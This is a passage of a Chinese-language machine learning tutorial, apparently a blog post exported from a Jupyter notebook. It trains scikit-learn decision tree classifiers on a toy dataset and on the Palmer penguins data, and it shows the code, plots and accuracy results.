class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 可视化构造的数据样本点</span></span><br><span class="line">plt.figure()</span><br><span class="line">plt.scatter(x_fearures[:,<span class="number">0</span>],x_fearures[:,<span class="number">1</span>], c=y_label, s=<span class="number">50</span>, cmap=<span class="string">&#x27;viridis&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;Dataset&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_5_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p><strong>Step4: 模型预测</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 创建新样本</span></span><br><span class="line">x_fearures_new1 = np.array([[<span class="number">0</span>, -<span class="number">1</span>]])</span><br><span class="line">x_fearures_new2 = np.array([[<span class="number">2</span>, <span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment">## 在训练集和测试集上分布利用训练好的模型进行预测</span></span><br><span class="line">y_label_new1_predict = tree_clf.predict(x_fearures_new1)</span><br><span class="line">y_label_new2_predict = tree_clf.predict(x_fearures_new2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The New point 1 predict class:\n&#x27;</span>,y_label_new1_predict)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The New point 2 predict class:\n&#x27;</span>,y_label_new2_predict)</span><br></pre></td></tr></table></figure><pre><code>The New point 1 predict class: [1]The New point 2 predict class: [0]</code></pre><h3 id="232-基于企鹅数据集的决策树实战"><a class="markdownIt-Anchor" href="#232-基于企鹅数据集的决策树实战">#</a> 2.3.2 基于企鹅数据集的决策树实战</h3><p>在实践的最开始，我们首先需要导入一些基础的函数库包括：numpy （Python 进行科学计算的基础软件包），pandas（pandas 是一种快速，强大，灵活且易于使用的开源数据分析和处理工具），matplotlib 和 seaborn 绘图。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#下载需要用到的数据集</span></span><br><span class="line">!wget https://tianchi-media.oss-cn-beijing.aliyuncs.com/DSW/6tree/penguins_raw.csv</span><br></pre></td></tr></table></figure><ul><li>Step1: 库函数导入</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##  基础函数库</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np </span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment">## 绘图函数库</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br></pre></td></tr></table></figure><p>本次我们选择企鹅数据（palmerpenguins）进行方法的尝试训练，该数据集一共包含 8 个变量，其中 7 个特征变量，1 个目标分类变量。共有 150 个样本，目标变量为 企鹅的类别 其都属于企鹅类的三个亚属，分别是 (Adélie, Chinstrap and Gentoo)。包含的三种种企鹅的七个特征，分别是所在岛屿，嘴巴长度，嘴巴深度，脚蹼长度，身体体积，性别以及年龄。</p><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td>species</td><td>a factor denoting penguin species</td></tr><tr><td>island</td><td>a factor denoting island in Palmer Archipelago, Antarctica</td></tr><tr><td>bill_length_mm</td><td>a number denoting bill length</td></tr><tr><td>bill_depth_mm</td><td>a number denoting bill depth</td></tr><tr><td>flipper_length_mm</td><td>an integer denoting flipper length</td></tr><tr><td>body_mass_g</td><td>an integer denoting body mass</td></tr><tr><td>sex</td><td>a factor denoting penguin sex</td></tr><tr><td>year</td><td>an integer denoting the study year</td></tr></tbody></table><ul><li>Step2: 数据读取 / 载入</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 我们利用Pandas自带的read_csv函数读取并转化为DataFrame格式</span></span><br><span class="line"></span><br><span class="line">data = pd.read_csv(<span class="string">&#x27;./penguins_raw.csv&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 为了方便我们仅选取四个简单的特征，有兴趣的同学可以研究下其他特征的含义以及使用方法</span></span><br><span class="line">data = data[[<span class="string">&#x27;Species&#x27;</span>,<span class="string">&#x27;Culmen Length (mm)&#x27;</span>,<span class="string">&#x27;Culmen Depth (mm)&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Flipper Length (mm)&#x27;</span>,<span class="string">&#x27;Body Mass (g)&#x27;</span>]]</span><br></pre></td></tr></table></figure><ul><li>Step3: 数据信息简单查看</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 利用.info()查看数据的整体信息</span></span><br><span class="line">data.info()</span><br></pre></td></tr></table></figure><pre><code>&lt;class 'pandas.core.frame.DataFrame'&gt;RangeIndex: 344 entries, 0 to 343Data columns (total 5 columns): #   Column               Non-Null Count  Dtype  ---  ------               --------------  -----   0   Species              344 non-null    object  1   Culmen Length (mm)   342 non-null    float64 2   Culmen Depth (mm)    342 non-null    float64 3   Flipper Length (mm)  342 non-null    float64 4   Body Mass (g)        342 non-null    float64dtypes: float64(4), object(1)memory usage: 13.6+ KB</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 进行简单的数据查看，我们可以利用 .head() 头部.tail()尾部</span></span><br><span class="line">data.head()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre></style><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Species</th>      <th>Culmen Length (mm)</th>      <th>Culmen Depth (mm)</th>      <th>Flipper Length (mm)</th>      <th>Body Mass (g)</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>Adelie Penguin (Pygoscelis adeliae)</td>      <td>39.1</td>      <td>18.7</td>      <td>181.0</td>      <td>3750.0</td>    </tr>    <tr>      <th>1</th>      <td>Adelie Penguin (Pygoscelis adeliae)</td>      <td>39.5</td>      <td>17.4</td>      <td>186.0</td>      <td>3800.0</td>    </tr>    <tr>      <th>2</th>      <td>Adelie Penguin (Pygoscelis adeliae)</td>      <td>40.3</td>      <td>18.0</td>      <td>195.0</td>      <td>3250.0</td>    </tr>    <tr>      <th>3</th>      <td>Adelie Penguin (Pygoscelis adeliae)</td>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>    </tr>    <tr>      <th>4</th>      <td>Adelie Penguin (Pygoscelis adeliae)</td>      <td>36.7</td>      <td>19.3</td>      <td>193.0</td>      <td>3450.0</td>    </tr>  </tbody></table></div><p>这里我们发现数据集中存在 NaN，一般的我们认为 NaN 在数据集中代表了缺失值，可能是数据采集或处理时产生的一种错误。这里我们采用 - 1 将缺失值进行填补，还有其他例如 “中位数填补、平均数填补” 的缺失值处理方法有兴趣的同学也可以尝试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = data.fillna(-<span class="number">1</span>)</span><br><span class="line">data.tail()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre></style><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Species</th>      <th>Culmen Length (mm)</th>      <th>Culmen Depth (mm)</th>      <th>Flipper Length (mm)</th>      <th>Body Mass (g)</th>    </tr>  </thead>  <tbody>    <tr>      <th>339</th>      <td>Chinstrap penguin (Pygoscelis antarctica)</td>      <td>55.8</td>      <td>19.8</td>      <td>207.0</td>      <td>4000.0</td>    </tr>    <tr>      <th>340</th>      <td>Chinstrap penguin (Pygoscelis antarctica)</td>      <td>43.5</td>      <td>18.1</td>      <td>202.0</td>      <td>3400.0</td>    </tr>    <tr>      <th>341</th>      <td>Chinstrap penguin (Pygoscelis antarctica)</td>      <td>49.6</td>      <td>18.2</td>      <td>193.0</td>      <td>3775.0</td>    </tr>    <tr>      <th>342</th>      <td>Chinstrap penguin (Pygoscelis antarctica)</td>      <td>50.8</td>      <td>19.0</td>      <td>210.0</td>      <td>4100.0</td>    </tr>    <tr>      <th>343</th>      <td>Chinstrap penguin (Pygoscelis antarctica)</td>      <td>50.2</td>      <td>18.7</td>      <td>198.0</td>      <td>3775.0</td>    </tr>  </tbody></table></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 其对应的类别标签为&#x27;Adelie Penguin&#x27;, &#x27;Gentoo penguin&#x27;, </span></span><br><span class="line"><span class="comment">## &#x27;Chinstrap penguin&#x27;三种不同企鹅的类别。</span></span><br><span class="line">data[<span class="string">&#x27;Species&#x27;</span>].unique()</span><br></pre></td></tr></table></figure><pre><code>array(['Adelie Penguin (Pygoscelis adeliae)',       'Gentoo penguin (Pygoscelis papua)',       'Chinstrap penguin (Pygoscelis antarctica)'], dtype=object)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 利用value_counts函数查看每个类别数量</span></span><br><span class="line">pd.Series(data[<span class="string">&#x27;Species&#x27;</span>]).value_counts()</span><br></pre></td></tr></table></figure><pre><code>Adelie Penguin (Pygoscelis adeliae)          152Gentoo penguin (Pygoscelis papua)            124Chinstrap penguin (Pygoscelis antarctica)     68Name: Species, dtype: int64</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 对于特征进行一些统计描述</span></span><br><span class="line">data.describe()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre></style><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Culmen Length (mm)</th>      <th>Culmen Depth (mm)</th>      <th>Flipper Length (mm)</th>      <th>Body Mass (g)</th>    </tr>  </thead>  <tbody>    <tr>      <th>count</th>      <td>344.000000</td>      <td>344.000000</td>      <td>344.000000</td>      <td>344.000000</td>    </tr>    <tr>      <th>mean</th>      <td>43.660756</td>      <td>17.045640</td>      <td>199.741279</td>      <td>4177.319767</td>    </tr>    <tr>      <th>std</th>      <td>6.428957</td>      <td>2.405614</td>      <td>20.806759</td>      <td>861.263227</td>    </tr>    <tr>      <th>min</th>      <td>-1.000000</td>      <td>-1.000000</td>      <td>-1.000000</td>      <td>-1.000000</td>    </tr>    <tr>      <th>25%</th>      <td>39.200000</td>      <td>15.500000</td>      <td>190.000000</td>      <td>3550.000000</td>    </tr>    <tr>      <th>50%</th>      <td>44.250000</td>      <td>17.300000</td>      <td>197.000000</td>      <td>4025.000000</td>    </tr>    <tr>      <th>75%</th>      <td>48.500000</td>      <td>18.700000</td>      <td>213.000000</td>      <td>4750.000000</td>    </tr>    <tr>      <th>max</th>      <td>59.600000</td>      <td>21.500000</td>      <td>231.000000</td>      <td>6300.000000</td>    </tr>  </tbody></table></div><ul><li>Step4: 可视化描述</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 特征与标签组合的散点可视化</span></span><br><span class="line">sns.pairplot(data=data, diag_kind=<span class="string">&#x27;hist&#x27;</span>, hue= <span class="string">&#x27;Species&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_24_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>从上图可以发现，在 2D 情况下不同的特征组合对于不同类别的企鹅的散点分布，以及大概的区分能力。Culmen Lenth 与其他特征的组合散点的重合较少，所以对于数据集的划分能力最好。<br>我们发现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;为了方便我们将标签转化为数字</span></span><br><span class="line"><span class="string">       &#x27;Adelie Penguin (Pygoscelis adeliae)&#x27;        ------0</span></span><br><span class="line"><span class="string">       &#x27;Gentoo penguin (Pygoscelis papua)&#x27;          ------1</span></span><br><span class="line"><span class="string">       &#x27;Chinstrap penguin (Pygoscelis antarctica)   ------2 &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x == data[<span class="string">&#x27;Species&#x27;</span>].unique()[<span class="number">0</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> x == data[<span class="string">&#x27;Species&#x27;</span>].unique()[<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> x == data[<span class="string">&#x27;Species&#x27;</span>].unique()[<span class="number">2</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">data[<span class="string">&#x27;Species&#x27;</span>] = data[<span class="string">&#x27;Species&#x27;</span>].apply(trans)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> data.columns:</span><br><span class="line">    <span class="keyword">if</span> col != <span class="string">&#x27;Species&#x27;</span>:</span><br><span class="line">        sns.boxplot(x=<span class="string">&#x27;Species&#x27;</span>, y=col, saturation=<span class="number">0.5</span>, palette=<span class="string">&#x27;pastel&#x27;</span>, data=data)</span><br><span class="line">        plt.title(col)</span><br><span class="line">        plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_27_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p><img "" class="lazyload placeholder" data-original="output_27_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_27_2.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_27_3.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p>利用箱型图我们也可以得到不同类别在不同特征上的分布差异情况。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 选取其前三个特征绘制三维散点图</span></span><br><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</span><br><span class="line"></span><br><span class="line">fig = plt.figure(figsize=(<span class="number">10</span>,<span class="number">8</span>))</span><br><span class="line">ax = fig.add_subplot(<span class="number">111</span>, projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data_class0 = data[data[<span class="string">&#x27;Species&#x27;</span>]==<span class="number">0</span>].values</span><br><span class="line">data_class1 = data[data[<span class="string">&#x27;Species&#x27;</span>]==<span class="number">1</span>].values</span><br><span class="line">data_class2 = data[data[<span class="string">&#x27;Species&#x27;</span>]==<span class="number">2</span>].values</span><br><span class="line"><span class="comment"># &#x27;setosa&#x27;(0), &#x27;versicolor&#x27;(1), &#x27;virginica&#x27;(2)</span></span><br><span class="line">ax.scatter(data_class0[:,<span class="number">0</span>], data_class0[:,<span class="number">1</span>], data_class0[:,<span class="number">2</span>],label=data[<span class="string">&#x27;Species&#x27;</span>].unique()[<span class="number">0</span>])</span><br><span class="line">ax.scatter(data_class1[:,<span class="number">0</span>], data_class1[:,<span class="number">1</span>], data_class1[:,<span class="number">2</span>],label=data[<span class="string">&#x27;Species&#x27;</span>].unique()[<span class="number">1</span>])</span><br><span class="line">ax.scatter(data_class2[:,<span class="number">0</span>], data_class2[:,<span class="number">1</span>], data_class2[:,<span class="number">2</span>],label=data[<span class="string">&#x27;Species&#x27;</span>].unique()[<span class="number">2</span>])</span><br><span class="line">plt.legend()</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_29_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><ul><li>Step5: 利用 决策树模型 在二分类上 进行训练和预测</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 为了正确评估模型性能，将数据划分为训练集和测试集，并在训练集上训练模型，</span></span><br><span class="line"><span class="comment">## 在测试集上验证模型性能。</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"></span><br><span class="line"><span class="comment">## 选择其类别为0和1的样本 （不包括类别为2的样本）</span></span><br><span class="line">data_target_part = data[data[<span class="string">&#x27;Species&#x27;</span>].isin([<span class="number">0</span>,<span class="number">1</span>])][[<span class="string">&#x27;Species&#x27;</span>]]</span><br><span class="line">data_features_part = data[data[<span class="string">&#x27;Species&#x27;</span>].isin([<span class="number">0</span>,<span class="number">1</span>])][[<span class="string">&#x27;Culmen Length (mm)&#x27;</span>,</span><br><span class="line">                                                        <span class="string">&#x27;Culmen Depth (mm)&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Flipper Length (mm)&#x27;</span>,<span class="string">&#x27;Body Mass (g)&#x27;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment">## 测试集大小为20%， 80%/20%分</span></span><br><span class="line">x_train, x_test, y_train, y_test = train_test_split(data_features_part, data_target_part, </span><br><span class="line">                                                    test_size = <span class="number">0.2</span>, random_state = <span class="number">2020</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 从sklearn中导入决策树模型</span></span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> tree</span><br><span class="line"><span class="comment">## 定义 决策树模型 </span></span><br><span class="line">clf = DecisionTreeClassifier(criterion=<span class="string">&#x27;entropy&#x27;</span>)</span><br><span class="line"><span class="comment"># 在训练集上训练决策树模型</span></span><br><span class="line">clf.fit(x_train, y_train)</span><br></pre></td></tr></table></figure><pre><code>DecisionTreeClassifier(criterion='entropy')</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 在训练集和测试集上分布利用训练好的模型进行预测</span></span><br><span class="line">train_predict = clf.predict(x_train)</span><br><span class="line">test_predict = clf.predict(x_test)</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> metrics</span><br><span class="line"></span><br><span class="line"><span class="comment">## 利用accuracy（准确度）【预测正确的样本数目占总预测样本数目的比例】评估模型效果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The accuracy of the Logistic Regression is:&#x27;</span>,metrics.accuracy_score(y_train,train_predict))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The accuracy of the Logistic Regression is:&#x27;</span>,metrics.accuracy_score(y_test,test_predict))</span><br><span class="line"></span><br><span class="line"><span class="comment">## 查看混淆矩阵 (预测值和真实值的各类情况统计矩阵)</span></span><br><span class="line">confusion_matrix_result = metrics.confusion_matrix(test_predict,y_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The confusion matrix result:\n&#x27;</span>,confusion_matrix_result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用热力图对于结果进行可视化</span></span><br><span class="line">plt.figure(figsize=(<span class="number">8</span>, <span class="number">6</span>))</span><br><span class="line">sns.heatmap(confusion_matrix_result, annot=<span class="literal">True</span>, cmap=<span class="string">&#x27;Blues&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Predicted labels&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;True labels&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>The accuracy of the Logistic Regression is: 0.9954545454545455The accuracy of the Logistic Regression is: 1.0The confusion matrix result: [[31  0] [ 0 25]]</code></pre><p><img "" class="lazyload placeholder" data-original="output_33_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p>我们可以发现其准确度为 1，代表所有的样本都预测正确了。</p><ul><li>Step6: 利用 决策树模型 在三分类 (多分类) 上 进行训练和预测</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 测试集大小为20%， 80%/20%分</span></span><br><span class="line">x_train, x_test, y_train, y_test = train_test_split(data[[<span class="string">&#x27;Culmen Length (mm)&#x27;</span>,<span class="string">&#x27;Culmen Depth (mm)&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Flipper Length (mm)&#x27;</span>,<span class="string">&#x27;Body Mass (g)&#x27;</span>]], data[[<span class="string">&#x27;Species&#x27;</span>]], test_size = <span class="number">0.2</span>, random_state = <span class="number">2020</span>)</span><br><span class="line"><span class="comment">## 定义 决策树模型 </span></span><br><span class="line">clf = DecisionTreeClassifier()</span><br><span class="line"><span class="comment"># 在训练集上训练决策树模型</span></span><br><span class="line">clf.fit(x_train, y_train)</span><br></pre></td></tr></table></figure><pre><code>DecisionTreeClassifier()</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 在训练集和测试集上分布利用训练好的模型进行预测</span></span><br><span class="line">train_predict = clf.predict(x_train)</span><br><span class="line">test_predict = clf.predict(x_test)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 由于决策树模型是概率预测模型（前文介绍的 p = p(y=1|x,\theta)）,所有我们可以利用 predict_proba 函数预测其概率</span></span><br><span class="line">train_predict_proba = clf.predict_proba(x_train)</span><br><span class="line">test_predict_proba = clf.predict_proba(x_test)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The test predict Probability of each class:\n&#x27;</span>,test_predict_proba)</span><br><span class="line"><span class="comment">## 其中第一列代表预测为0类的概率，第二列代表预测为1类的概率，第三列代表预测为2类的概率。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 利用accuracy（准确度）【预测正确的样本数目占总预测样本数目的比例】评估模型效果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The accuracy of the Logistic Regression is:&#x27;</span>,metrics.accuracy_score(y_train,train_predict))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The accuracy of the Logistic Regression is:&#x27;</span>,metrics.accuracy_score(y_test,test_predict))</span><br></pre></td></tr></table></figure><pre><code>The test predict Probability of each class: [[0. 0. 1.] [0. 1. 0.] [0. 1. 0.] [1. 0. 0.] [1. 0. 0.] [0. 0. 1.] [0. 0. 1.] [1. 0. 0.] [0. 1. 0.] [1. 0. 0.] [0. 1. 0.] [0. 1. 0.] [1. 0. 0.] [0. 1. 0.] [0. 1. 0.] [0. 1. 0.] [1. 0. 0.] [0. 1. 0.] [1. 0. 0.] [1. 0. 0.] [0. 0. 1.] [1. 0. 0.] [0. 0. 1.] [1. 0. 0.] [1. 0. 0.] [1. 0. 0.] [0. 1. 0.] [1. 0. 0.] [0. 1. 0.] [1. 0. 0.] [1. 0. 0.] [0. 0. 1.] [0. 0. 1.] [0. 1. 0.] [1. 0. 0.] [0. 1. 0.] [0. 1. 0.] [1. 0. 0.] [1. 0. 0.] [0. 1. 0.] [1. 0. 0.] [1. 0. 0.] [0. 1. 0.] [1. 0. 0.] [1. 0. 0.] [0. 0. 1.] [0. 0. 1.] [1. 0. 0.] [1. 0. 0.] [0. 1. 0.] [1. 0. 0.] [1. 0. 0.] [0. 1. 0.] [0. 1. 0.] [0. 0. 1.] [0. 0. 1.] [0. 1. 0.] [1. 0. 0.] [1. 0. 0.] [1. 0. 0.] [0. 1. 0.] [0. 1. 0.] [0. 0. 1.] [0. 0. 1.] [1. 0. 0.] [0. 1. 0.] [0. 0. 1.] [1. 0. 0.] [1. 0. 0.]]The accuracy of the Logistic Regression is: 0.9963636363636363The accuracy of the Logistic Regression is: 0.9710144927536232</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 查看混淆矩阵</span></span><br><span class="line">confusion_matrix_result = metrics.confusion_matrix(test_predict,y_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The confusion matrix result:\n&#x27;</span>,confusion_matrix_result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用热力图对于结果进行可视化</span></span><br><span class="line">plt.figure(figsize=(<span class="number">8</span>, <span class="number">6</span>))</span><br><span class="line">sns.heatmap(confusion_matrix_result, annot=<span class="literal">True</span>, cmap=<span class="string">&#x27;Blues&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Predicted labels&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;True labels&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>The confusion matrix result: [[31  1  0] [ 0 23  0] [ 1  0 13]]</code></pre><p><img "" class="lazyload placeholder" data-original="output_37_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><h2 id="24-重要知识点"><a 